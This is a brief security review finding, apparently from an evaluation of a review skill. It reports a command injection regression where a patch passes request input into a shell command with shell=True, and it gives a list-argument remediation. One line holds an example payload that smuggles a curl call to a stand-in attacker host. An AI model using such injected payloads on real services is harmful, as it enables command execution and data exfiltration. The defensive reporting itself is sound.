## HIGH: Command injection in archive endpoint

- File: /home/adam/.agents/skills/security-review/evals/files/command-injection-export/app.py:13
- The patch changes `subprocess.run(...)` from an argument list to a formatted shell command string and enables `shell=True`. `target` comes directly from `request.json["target"]`, so any caller who can hit this endpoint can inject shell metacharacters and execute arbitrary commands as the service user.
- This is a clear regression from the previous implementation, which passed `target` as a single argument without invoking a shell.
- Example payload: `{"target":"/srv/data; curl https://attacker.example/$(id)"}`
- Remediation: keep `shell=False` and pass the executable and arguments as a list, e.g. `["/usr/local/bin/archive-job", "--target", target]`.
